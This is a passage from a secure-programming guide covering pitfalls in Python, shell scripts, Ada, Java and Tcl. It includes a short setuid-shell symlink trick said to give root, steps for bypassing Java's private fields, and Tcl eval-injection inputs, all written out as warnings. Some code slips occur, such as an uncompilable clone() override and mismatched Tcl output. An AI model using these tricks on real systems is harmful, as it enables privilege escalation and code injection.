The user module causes the pythonrc.py file to be read and executed.
Since this file would be under the control of an untrusted user,
importing the user module allows an attacker to force the trusted
program to run arbitrary code.</P
><P
>Python does very little compile-time checking -- it has essentially
no compile-time type information, for example.
This is unfortunate, resulting in a lot of latent bugs
(both John Viega and I have experienced this problem).
Hopefully someday Python will implement optional static typing and
type-checking, an idea that&#8217;s been discussed for some time.
A partial solution for now is PyChecker, a lint-like program that
checks for common bugs in Python source code.
You can get PyChecker from
<A
HREF="http://pychecker.sourceforge.net"
TARGET="_top"
>http://pychecker.sourceforge.net</A
></P
><P
>Before Python version 2.3,
Python included support for <SPAN
CLASS="QUOTE"
>&#8220;Restricted Execution&#8221;</SPAN
> through
its RExec and Bastion classes.
The RExec class was primarily intended for executing applets and mobile code,
but it could also be used to try to limit privilege in a program even when the
code has not been provided externally.
The Bastion module was intended to supports
restricted access to another object.
For more information, see Kuchling [2000].
Earlier versions of this book identified these functions but noted them as
"programmer beware", and I was right to be concerned.
More recent analysis has found that RExec and Bastion are
fundamentally flawed, and have unfixable exploitable security flaws.
Thus, these classes have been removed from Python 2.3,
and should not be used to enforce security in any version of Python.
There is ongoing work to develop alternative approaches to running
untrusted Python code, such as the experimental
<A
HREF="http://www.procoders.net/download.php?fname=SandBox.py"
TARGET="_top"
>Sandbox.py module</A
>.
Do not use this experimental Sandbox.py module for serious purposes yet.</P
><P
>Supporting secure execution of untrusted code in Python turns out to be a
rather difficult problem.
For example, allowing a user to unrestrictedly add attributes to a
class permits all sorts of ways to subvert the environment
because Python&#8217;s implementation calls many <SPAN
CLASS="QUOTE"
>&#8220;hidden&#8221;</SPAN
> methods.
By default, most Python objects are passed by reference; if you
insert a reference to a mutable value into a restricted program&#8217;s environment,
the restricted program can change the object in a way that&#8217;s visible
outside the restricted environment.
Thus, if you want to give access to a mutable value, in many cases
you should copy the mutable value.
Fundamentally, Python is designed to be a clean and highly reflexive
language, which is good for a general-purpose language but makes handling
malicious code more difficult.</P
><P
>Python supports operations called "pickle" and "unpickling"
to conveniently store and retrieve sets of objects.
NEVER unpickle data from an untrusted source.
Python 2.2 did a half-hearted job of trying to support unpickling from
untrusted sources (the __safe_for_unpickling__ attribute),
but it was never audited and probably never really worked.
Python 2.3 has removed all of this, and made explicitly clear that
unpickling is not a safe operation.
For more information, see
<A
HREF="http://www.python.org/peps/pep-0307.html"
TARGET="_top"
>PEP 307</A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SHELL"
>10.4. Shell Scripting Languages (sh and csh Derivatives)</A
></H2
><P
>I strongly recommend against using
standard command shell scripting languages (such as csh, sh, and bash)
for setuid/setgid secure code.
Some systems (such as Linux) completely disable setuid/setgid
shell scripts, so creating setuid/setgid shell scripts creates
an unnecessary portability problem.
On some old systems they are fundamentally insecure due to a race condition
(as discussed in <A
HREF="#PROCESS-CREATION"
>Section 3.1.3</A
>).
Even for other systems, they&#8217;re not really a good idea.</P
><P
>In fact, there are a vast number of circumstances where shell scripting
languages shouldn&#8217;t be used at all for secure programs.
Standard command shells are notorious for being affected by nonobvious inputs -
generally because command shells were designed to try to do
things <SPAN
CLASS="QUOTE"
>&#8220;automatically&#8221;</SPAN
> for an interactive user, not to defend against
a determined attacker.
Shell programs are fine for programs that don&#8217;t need to be secure
(e.g., they run at the same privilege as the unprivileged
user and don&#8217;t accept <SPAN
CLASS="QUOTE"
>&#8220;untrusted&#8221;</SPAN
> data).
They can also be useful when they&#8217;re running with privilege, as long as
all the input (e.g., files, directories, command line, environment, etc.)
are all from trusted users - which is why they&#8217;re
often used quite successfully in startup/shutdown scripts.</P
><P
>Writing secure shell programs in the presence of malicious
input is harder than in many other languages because
of all the things that shells are affected by.
For example,
<SPAN
CLASS="QUOTE"
>&#8220;hidden&#8221;</SPAN
> environment variables (e.g., the ENV, BASH_ENV, and IFS values)
can affect how they operate or even execute arbitrary user-defined
code before the script can even execute.
Even things like filenames of the executable or directory contents can
affect execution.
If an attacker can create filenames containing
some control characters (e.g., newline),
or whitespace, or shell metacharacters, or begin with a dash
(the option flag syntax), there are often ways to exploit them.
For example, on many Bourne shell implementations, doing the following
will grant root access (thanks to NCSA for describing this
exploit):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> % ln -s /usr/bin/setuid-shell /tmp/-x
 % cd /tmp
 % -x</PRE
></FONT
></TD
></TR
></TABLE
>
Some systems may have closed this hole, but the point still stands:
most command shells aren&#8217;t intended for writing secure setuid/setgid programs.
For programming purposes, avoid creating setuid shell scripts, even
on those systems that permit them.
Instead, write a small program in another language to clean up the
environment, then have it call other executables (some of which
might be shell scripts).</P
><P
>If you still insist on using shell scripting languages, at least
put the script in a directory where it cannot be moved or changed.
Set PATH and IFS to known values very early in your script; indeed, the
environment should be cleaned before the script is called.
Also, very early on, <SPAN
CLASS="QUOTE"
>&#8220;cd&#8221;</SPAN
> to a safe directory.
Use data only from directories that is controlled by trusted users, e.g., /etc,
so that attackers can&#8217;t insert maliciously-named files into those directories.
Be sure to quote every filename passed on a command line, e.g., use
"$1" not $1, because filenames with whitespace will be split.
Call commands using "--" to disable additional options where you can,
because attackers may create or pass filenames beginning with dash in the
hope of tricking the program into processing it as an option.
Be especially careful of filenames embedding other characters
(e.g., newlines and other control characters).
Examine input filenames especially carefully and be very restrictive
on what filenames are permitted.</P
><P
>If you don&#8217;t mind limiting your program to only work with GNU tools
(or if you detect and optionally use the GNU tools instead when
they are available), you might want
to use NIL characters as the filename terminator instead of newlines.
By using NIL characters, rather than whitespace or newlines,
handling nasty filenames (e.g., those with
embedded newlines) is much simpler.
Several GNU tools that output or input filenames can use this format
instead of the more common <SPAN
CLASS="QUOTE"
>&#8220;one filename per line&#8221;</SPAN
> format.
Unfortunately, the name of this option isn&#8217;t consistent between tools;
for many tools the name of this option is <SPAN
CLASS="QUOTE"
>&#8220;--null&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;-0&#8221;</SPAN
>.
GNU programs xargs and cpio allow using either --null or -0,
tar uses --null,
find uses -print0,
grep uses either --null or -Z, and
sort uses either -z or --zero-terminated.
Those who find this inconsistency particularly disturbing are invited
to supply patches to the GNU authors;
I would suggest making sure every program supported <SPAN
CLASS="QUOTE"
>&#8220;--null&#8221;</SPAN
> since that
seems to be the most common option name.
For example, here&#8217;s one way to move files to a target directory, even
if there may be a vast number of files and some may have awkward names
with embedded newlines
(thanks to Jim Dennis for reminding me of this):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> find . -print0 | xargs --null mv --target-dir=$TARG</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>In a similar vein, I recommend <EM
>not</EM
> trusting
<SPAN
CLASS="QUOTE"
>&#8220;restricted shells&#8221;</SPAN
> to implement secure policies.
Restricted shells are shells that intentionally prevent users from
performing a large set of activities - their goal is to force users
to only run a small set of programs.
A restricted shell can be useful as a defense-in-depth measure, but
restricted shells are notoriously hard to configure correctly and as
configured are often subvertable.
For example, some restricted shells will start by running some file
in an unrestricted mode (e.g., <SPAN
CLASS="QUOTE"
>&#8220;.profile&#8221;</SPAN
>) - if a user can change this
file, they can force execution of that code.
A restricted shell should be set up to only run a few programs, but
if any of those programs have <SPAN
CLASS="QUOTE"
>&#8220;shell escapes&#8221;</SPAN
> to let users run more
programs, attackers can use those shell escapes to escape the
restricted shell.
Even if the programs don&#8217;t have shell escapes, it&#8217;s quite likely that
the various programs can be used together (along with the shell&#8217;s capabilities)
to escape the restrictions.
Of course, if you don&#8217;t set the PATH of a restricted shell (and allow
any program to run), then an attacker can use the shell escapes of
many programs (including text editors, mailers, etc.).
The problem is that the purpose of a shell is to run other programs,
but those other programs may allow unintended operations -- and the
shell doesn&#8217;t interpose itself to prevent these operations.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="ADA"
>10.5. Ada</A
></H2
><P
>In Ada95, the Unbounded_String type is often more flexible than the
String type because it is automatically resized as necessary.
However, don&#8217;t store especially sensitive secret values such as passwords
or secret keys in an Unbounded_String, since core dumps and page areas
might still hold them later.
Instead, use the String type for this data, lock it into memory
while it&#8217;s used, and overwrite the data as
soon as possible with some constant value such as (others =&#62; ' ').
Use the Ada pragma Inspection_Point on the object holding the secret
after erasing the memory.
That way, you can be certain that
the object containing the secret will really be erased
(and that the the overwriting won&#8217;t be optimized away).</P
><P
>Like many other languages,
Ada&#8217;s string types (including String and Unbounded_String)
can hold ASCII 0.
If that&#8217;s then passed to a C library (including a kernel), that can be
interpreted very differently by the library than the caller intended.</P
><P
>It&#8217;s common for beginning Ada programmers to believe that the
String type&#8217;s first index value is always 1, but this isn&#8217;t true if
the string is sliced.
Avoid this error.</P
><P
>It&#8217;s worth noting that SPARK is
a <SPAN
CLASS="QUOTE"
>&#8220;high-integrity subset of the Ada programming language&#8221;</SPAN
>;
SPARK users use a tool called the <SPAN
CLASS="QUOTE"
>&#8220;SPARK Examiner&#8221;</SPAN
> to check
conformance to SPARK rules, including flow analysis, and there are
various supports for full formal proof of the code if desired.
<A
HREF="http://www.sparkada.com"
TARGET="_top"
>See the SPARK website for more
information</A
>.
To my knowledge, there are no OSS/FS SPARK tools.
If you&#8217;re storing passwords and private keys you should still
lock them into memory if appropriate
and overwrite them as soon as possible.
Note that SPARK is often used in environments where paging does not occur.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="JAVA"
>10.6. Java</A
></H2
><P
>If you&#8217;re developing secure programs using Java,
frankly your first step (after learning Java)
is to read the two primary texts for Java security, namely
Gong [1999]
and
McGraw [1999] (for the latter, look particularly at section 7.1).
You should also look at Sun&#8217;s posted security code guidelines at
<A
HREF="http://java.sun.com/security/seccodeguide.html"
TARGET="_top"
>http://java.sun.com/security/seccodeguide.html</A
>, and
there&#8217;s a nice
<A
HREF="http://www-106.ibm.com/developerworks/java/library/j-staticsec.html?loc=dwmain"
TARGET="_top"
>article by Sahu et al [2002]</A
>
A set of slides describing Java&#8217;s security model are freely available at
<A
HREF="http://www.dwheeler.com/javasec"
TARGET="_top"
>http://www.dwheeler.com/javasec</A
>.
You can also see McGraw [1998].</P
><P
>Obviously, a great deal depends on the kind of application you&#8217;re developing.
Java code intended for use on the client side has a completely different
environment (and trust model) than code on a server side.
The general principles apply, of course; for example, you must
check and filter any input from an untrusted source.
However, in Java there are some <SPAN
CLASS="QUOTE"
>&#8220;hidden&#8221;</SPAN
> inputs or potential inputs that you
need to be wary of, as discussed below.
Johnathan Nightingale [2000] made an interesting statement
summarizing many of the issues in Java programming:
<A
NAME="AEN2672"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>... the big thing with Java programming is minding your inheritances.
If you inherit methods from parents, interfaces, or
parents&#8217; interfaces, you risk opening doors to your code. </P
></BLOCKQUOTE
></P
><P
>The following are a few key guidelines, based on Gong [1999],
McGraw [1999], Sun&#8217;s guidance, and my own experience:

<P
></P
><OL
TYPE="1"
><LI
><P
>Do not use public fields or variables; declare them as private and
provide accessors to them so you can limit their accessibility.</P
></LI
><LI
><P
>Make methods private unless there is a good reason to do otherwise
(and if you do otherwise, document why).
These non-private methods must protect themselves, because they may
receive tainted data (unless you&#8217;ve somehow arranged to protect them).</P
></LI
><LI
><P
>The JVM may not actually enforce the accessibility modifiers
(e.g., <SPAN
CLASS="QUOTE"
>&#8220;private&#8221;</SPAN
>) at run-time in an application
(as opposed to an applet).
My thanks to John Steven (Cigital Inc.), who pointed this out
on the <SPAN
CLASS="QUOTE"
>&#8220;Secure Programming&#8221;</SPAN
> mailing list on November 7, 2000.
The issue is that it all depends on what class loader
the class requesting the access was loaded with.
If the class was loaded with a trusted class loader (including the null/
primordial class loader),
the access check returns "TRUE" (allowing access).
For example, this works
(at least with Sun&#8217;s 1.2.2 VM ; it might not work with
other implementations):
<P
></P
><OL
TYPE="a"
><LI
><P
>write a victim class (V) with a public field, compile it.</P
></LI
><LI
><P
>write an <SPAN
CLASS="QUOTE"
>&#8220;attack&#8221;</SPAN
> class (A) that accesses that field, compile it </P
></LI
><LI
><P
>change V&#8217;s public field to private, recompile</P
></LI
><LI
><P
>run A - it&#8217;ll access V&#8217;s (now private) field.</P
></LI
></OL
></P
><P
>However, the situation is different with applets.
If you convert A to an applet and run it as an applet
(e.g., with appletviewer or browser), its class loader is no
longer a trusted (or null) class loader.
Thus, the code will throw
java.lang.IllegalAccessError, with the message that
you&#8217;re trying to access a field V.secret from class A.</P
></LI
><LI
><P
>Avoid using static field variables. Such variables are attached to the
class (not class instances), and classes can be located by any other class.
As a result, static field variables can be found by any other class, making
them much more difficult to secure.</P
></LI
><LI
><P
>Never return a mutable object to potentially malicious code
(since the code may decide to change it).
Note that arrays are mutable (even if the array contents aren&#8217;t),
so don&#8217;t return a reference to an internal array with sensitive data.</P
></LI
><LI
><P
>Never store user given mutable objects (including arrays of objects)
directly.
Otherwise, the user could hand the object to the secure code, let the
secure code <SPAN
CLASS="QUOTE"
>&#8220;check&#8221;</SPAN
> the object, and change the data while the secure code
was trying to use the data.
Clone arrays before saving them internally, and be careful here
(e.g., beware of user-written cloning routines).</P
></LI
><LI
><P
>Don&#8217;t depend on initialization.
There are several ways to allocate uninitialized objects.</P
></LI
><LI
><P
>Make everything final, unless there&#8217;s a good reason not to.
If a class or method is non-final, an attacker could try to extend it
in a dangerous and unforeseen way.
Note that this causes a loss of extensibility, in exchange for security.</P
></LI
><LI
><P
>Don&#8217;t depend on package scope for security.
A few classes, such as java.lang, are closed by default, and some
Java Virtual Machines (JVMs) let you close off other packages.
Otherwise, Java classes are not closed.
Thus, an attacker could introduce a new class inside your package,
and use this new class to access the things you thought you were protecting.</P
></LI
><LI
><P
>Don&#8217;t use inner classes.
When inner classes are translated into byte codes, the inner class
is translated into a class accesible to any class in the package.
Even worse, the enclosing class&#8217;s private fields silently
become non-private to permit access by the inner class!</P
></LI
><LI
><P
>Minimize privileges.
Where possible, don&#8217;t require any special permissions at all.
McGraw goes further and recommends not signing any code; I say
go ahead and sign the code (so users can decide to
<SPAN
CLASS="QUOTE"
>&#8220;run only signed code by this list of senders&#8221;</SPAN
>),
but try to write the program
so that it needs nothing more than the sandbox set of privileges.
If you must have more privileges, audit that code especially hard.</P
></LI
><LI
><P
>If you must sign your code, put it all in one archive file.
Here it&#8217;s best to quote McGraw [1999]:
<A
NAME="AEN2715"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>The goal of this rule is to prevent
an attacker from carrying out a mix-and-match
attack in which the attacker constructs a new applet
or library that links some of your signed classes together
with malicious classes, or links together signed classes that you
never meant to be used together.
By signing a group of classes together, you make this attack more difficult.
Existing code-signing systems do an inadequate job of
preventing mix-and-match attacks, so this rule cannot
prevent such attacks completely. But using a single archive can&#8217;t hurt.</P
></BLOCKQUOTE
></P
></LI
><LI
><P
>Make your classes uncloneable.
Java&#8217;s object-cloning mechanism allows an attacker to
instantiate a class without running any of its constructors.
To make your class uncloneable, just define the following method
in each of your classes:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>public final Object clone() throws java.lang.CloneNotSupportedException {
   throw new java.lang.CloneNotSupportedException();
   }</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>If you really need to make your class cloneable, then there are some
protective measures you can take to prevent attackers from redefining
your clone method.
If you&#8217;re defining your own clone method, just make it final.
If you&#8217;re not, you can at least prevent the clone method from 
being maliciously overridden by adding the following:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>public final void clone() throws java.lang.CloneNotSupportedException {
  super.clone();
  }</PRE
></FONT
></TD
></TR
></TABLE
></P
></LI
><LI
><P
>Make your classes unserializeable.
Serialization allows attackers to view the internal state of your objects,
even private portions.
To prevent this, add this method to your classes:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>private final void writeObject(ObjectOutputStream out)
  throws java.io.IOException {
     throw new java.io.IOException("Object cannot be serialized");
  }</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Even in cases where serialization is okay, be sure to use
the transient keyword for the fields
that contain direct handles to system resources and
that contain information relative to an address space. 
Otherwise, deserializing the class may permit improper access.
You may also want to identify sensitive information as transient.</P
><P
>If you define your own serializing method for a class,
it should not pass an internal array to any DataInput/DataOuput
method that takes an array.
The rationale: All DataInput/DataOutput methods can be overridden.
If a Serializable class passes a private array directly to a DataOutput(write(byte [] b)) method, then an attacker
could subclass ObjectOutputStream and override the write(byte [] b)
method to enable him to access and modify the private array. 
Note that the default serialization does not expose private
byte array fields to DataInput/DataOutput byte array methods. </P
></LI
><LI
><P
>Make your classes undeserializeable.
Even if your class is not serializeable, it may still be deserializeable.
An attacker can create a sequence of bytes that happens
to deserialize to an instance of your class with values of the
attacker&#8217;s choosing.
In other words, deserialization is a kind of public constructor, allowing
an attacker to choose the object&#8217;s state - clearly a dangerous operation!
To prevent this, add this method to your classes:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>private final void readObject(ObjectInputStream in)
  throws java.io.IOException {
    throw new java.io.IOException("Class cannot be deserialized");
  }</PRE
></FONT
></TD
></TR
></TABLE
></P
></LI
><LI
><P
>Don&#8217;t compare classes by name.
After all, attackers can define classes with identical names, and if
you&#8217;re not careful you can cause confusion by granting these classes
undesirable privileges.
Thus, here&#8217;s an example of the <EM
>wrong</EM
> way
to determine if an object has a given class:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  if (obj.getClass().getName().equals("Foo")) {</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>If you need to determine if two objects have exactly the
same class, instead
use getClass() on both sides and compare using the == operator, 
Thus, you should use this form:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  if (a.getClass() == b.getClass()) {</PRE
></FONT
></TD
></TR
></TABLE
>
If you truly need to determine if an object has a given classname, you
need to be pedantic and be sure to use the current namespace
(of the current class&#8217;s ClassLoader).
Thus, you&#8217;ll need to use this format:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  if (obj.getClass() == this.getClassLoader().loadClass("Foo")) {</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>This guideline is from McGraw and Felten, and it&#8217;s a good guideline.
I&#8217;ll add that, where possible, it&#8217;s often a good idea to avoid comparing
class values anyway.
It&#8217;s often better to try to design class methods and interfaces so you
don&#8217;t need to do this at all.
However, this isn&#8217;t always practical, so it&#8217;s important to know these tricks.</P
></LI
><LI
><P
>Don&#8217;t store secrets (cryptographic keys, passwords, or
algorithm) in the code or data.
Hostile JVMs can quickly view this data.
Code obfuscation doesn&#8217;t really hide the code from serious attackers.</P
></LI
></OL
>&#13;</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="TCL"
>10.7. Tcl</A
></H2
><P
>Tcl stands for <SPAN
CLASS="QUOTE"
>&#8220;tool command language&#8221;</SPAN
> and is pronounced <SPAN
CLASS="QUOTE"
>&#8220;tickle.&#8221;</SPAN
>
Tcl is divided into two parts: a language and a library.
The language is a simple language, originally intended for issuing commands
to interactive programs and including basic programming capabilities.
The library can be embedded in application programs. 
You can find more information about Tcl at sites such as the
<A
HREF="http://www.tcl.tk/"
TARGET="_top"
>Tcl.tk</A
> and the
<A
HREF="http://www.sco.com/Technology/tcl/Tcl.html"
TARGET="_top"
>Tcl WWW Info</A
>
web page and the comp.lang.tcl FAQ launch page at
<A
HREF="http://www.tclfaq.wservice.com/tcl-faq"
TARGET="_top"
>http://www.tclfaq.wservice.com/tcl-faq</A
>.
My thanks go to Wojciech Kocjan for providing some of this detailed
information on using Tcl in secure applications.</P
><P
>For some security applications, especially interesting components of Tcl
are Safe-Tcl (which creates a sandbox in Tcl)
and Safe-TK (which implements a sandboxed portable GUI for Safe Tcl), as
well as the WebWiseTclTk Toolkit which permits Tcl packages to be automatically
located and loaded from anywhere on the World Wide Web.
You can find more about the latter from
<A
HREF="http://www.cbl.ncsu.edu/software/WebWiseTclTk"
TARGET="_top"
>http://www.cbl.ncsu.edu/software/WebWiseTclTk</A
>.
It&#8217;s not clear to me how much code review this has received.</P
><P
>Tcl&#8217;s original design goal to be a small, simple
language resulted in a language that was originally somewhat limiting
and slow.
For an example of the limiting weaknesses in the original language, see
<A
HREF="http://sdg.lcs.mit.edu/~jchapin/6853-FT97/Papers/stallman-tcl.html"
TARGET="_top"
>Richard Stallman&#8217;s <SPAN
CLASS="QUOTE"
>&#8220;Why You Should Not Use Tcl&#8221;</SPAN
></A
>.
For example, Tcl was originally designed to really support only
one data type (string).
Thankfully, these issues have been addressed over time.
In particular, version 8.0 added support for more data types
(integers are stored internally as integers, lists as lists and so on).
This improves its capabilities, and in particular improves its speed.</P
><P
>As with essentially all scripting languages,
Tcl has an "eval" command that parses and executes arbitrary Tcl commands.
And like all such scripting languages, this eval command needs to be
used especially carefully, or an attacker could insert
characters in the input to cause malicious things to occur.
For example, an attackers may be able insert characters
with special meaning to Tcl
such as embedded whitespace (including space and newline),
double-quote, curly braces, square brackets,
dollar signs, backslash, semicolon, or pound sign (or create input
to cause these characters to be created during processing).
This also applies to any function that passes data to eval as well
(depending on how eval is called).</P
><P
>Here is a small example that may make this concept clearer;
first, let&#8217;s define a small function and then interactively invoke it
directly - note that these uses are fine:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> proc something {a b c d e} {
       puts "A='$a'"
       puts "B='$b'"
       puts "C='$c'"
       puts "D='$d'"
       puts "E='$e'"
 }
 
 % # This works normally:
 % something "test 1" "test2" "t3" "t4" "t5"
 A='test 1'
 B='test2'
 C='t3'
 D='t4'
 E='t5'
 
 % # Imagine that str1 is set by an attacker:
 % set str1 {test 1 [puts HELLOWORLD]}
 
 % # This works as well
 % something $str1 t2 t3 t4 t5
 A='test 1 [puts HELLOWORLD]'
 B='t2'
 C='t3'
 D='t4'
 E='t5'</PRE
></FONT
></TD
></TR
></TABLE
>

However, continuing the example, let&#8217;s see how "eval"
can be incorrectly and correctly called.
If you call eval in an incorrect (dangerous) way, it
allows attackers to misuse it.
However, by using commands like list or lrange to correctly
group the input, you can avoid this problem:
 
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> % # This is the WRONG way - str1 is interpreted.
 % eval something $str1 t2 t3
 HELLOWORLD
 A='test'
 B='1'
 C=''
 D='t2'
 E='t3'
 
 % # Here&#38;rsquo;s one solution, using "list".
 % eval something [list $str1 t2 t3 t4 t5]
 A='test 1 [puts HELLOWORLD]'
 B='t2'
 C='t3'
 D='t4'
 E='t5'
 
 % # Here&#38;rsquo;s another solution, using lrange:
 % eval something [lrange $str1 0 end] t2
 A='test'
 B='1'
 C='[puts'
 D='HELLOWORLD]'
 E='t2'</PRE
></FONT
></TD
></TR
></TABLE
>
Using lrange is useful when concatenating arguments to a called
function, e.g., with more complex libraries using callbacks.
In Tcl, eval is often used to create a one-argument version of a function
that takes a variable number of arguments, and you need to be careful
when using it this way.
Here&#8217;s another example (presuming that you&#8217;ve defined a "printf" function):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> proc vprintf {str arglist} {
      eval printf [list $str] [lrange $arglist 0 end]
 }
 
 % printf "1+1=%d  2+2=%d" 2 4
 % vprintf "1+1=%d  2+2=%d" {2 4}</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Fundamentally, when passing a command that will be eventually
evaluated, you must pass Tcl commands as a properly built list,
and not as a (possibly concatentated) string.
For example, the "after" command runs a Tcl command after a given
number of milliseconds; if the data in $param1 can be controlled by
an attacker, this Tcl code is dangerously wrong:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  # DON'T DO THIS if param1 can be controlled by an attacker
  after 1000 "someCommand someparam $param1"</PRE
></FONT
></TD
></TR
></TABLE
>
This is wrong, because if an attacker can control the value of $param1,
the attacker can control the program.
For example, if the attacker can cause $param1 to have
<SPAN
CLASS="QUOTE"
>&#8220;[exit]&#8221;</SPAN
>, then the program will exit.
Also, if $param1 would be <SPAN
CLASS="QUOTE"
>&#8220;;exit&#8221;</SPAN
>, it would also exit.</P
><P
>Thus, the proper alternative would be:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> after 1000 [list someCommand someparam $param1]</PRE
></FONT
></TD
></TR
></TABLE
>
Even better would be something like the following:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> set cmd [list someCommand someparam]
 after 1000 [concat $cmd $param1]</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Here&#8217;s another example showing what you shouldn&#8217;t do,
pretending that $params is data controlled by possibly malicious user:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> set params "%-20s TESTSTRING"
 puts "'[eval format $params]'"</PRE
></FONT
></TD
></TR
></TABLE
>
will result in:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> 'TESTSTRING       '</PRE
></FONT
></TD
></TR
></TABLE
>
But, when if the untrusted user sends data with an embedded newline,
like this:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> set params "%-20s TESTSTRING\nputs HELLOWORLD"
 puts "'[eval format $params]'"</PRE
></FONT
></TD
></TR
></TABLE
>
The result will be this (notice that the attacker&#8217;s code was executed!):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> HELLOWORLD
 'TESTINGSTRING       '</PRE
></FONT
></TD
></TR
></TABLE
>
Wojciech Kocjan suggests that the
simplest solution in this case is to convert this to a list using
lrange, doing this:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> set params "%-20s TESTINGSTRING\nputs HELLOWORLD"
 puts "'[eval format [lrange $params 0 end]]'"</PRE
></FONT
></TD
></TR
></TABLE
>
The result would be:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> 'TESTINGSTRING       '</PRE
></FONT
></TD
></TR
></TABLE
>
Note that this solution presumes that the potentially malicious
text is concatenated to the end of the text; as with all languages,
make sure the attacker cannot control the format text.</P
><P
>As a matter of style always use curly braces
when using if, while, for, expr, and any other command which
parses an argument using expr/eval/subst.
Doing this will avoid
a common error when using Tcl called unintended double substitution
(aka double substitution).
This is best explained by example; the following code is incorrect:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> while ![eof $file] {
     set line [gets $file]
 }</PRE
></FONT
></TD
></TR
></TABLE
>
The code is incorrect because the "![eof $file]" text will be evaluated
by the Tcl parser when the while command is executed the first time,
and not re-evaluated in every iteration as it should be.
Instead, do this:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> while {![eof $file]} {
      set line [gets $file]
 }</PRE
></FONT
></TD
></TR
></TABLE
>
Note that both the condition, and the action to be performed,
are surrounded by curly braces.
Although there are cases where the braces are redundant, they never hurt,
and when you fail to include the curly braces where they&#8217;re needed
(say, when making a minor change) subtle and hard-to-find
errors often result.</P
><P
>More information on good Tcl style can be found in documents such as
<A
HREF="http://www.tcl.tk/doc/styleGuide.pdf"
TARGET="_top"
>Ray Johnson&#8217;s Tcl Style Guide</A
>.</P
><P
>In the past, I have stated that
I don&#8217;t recommend Tcl for writing programs which must
mediate a security boundary.
Tcl seems to have improved since that time, so while I cannot guarantee
Tcl will work for your needs, I can&#8217;t guarantee that any other language
will work for you either.
Again, my thanks to Wojciech Kocjan who provided some
of these suggestions on how to
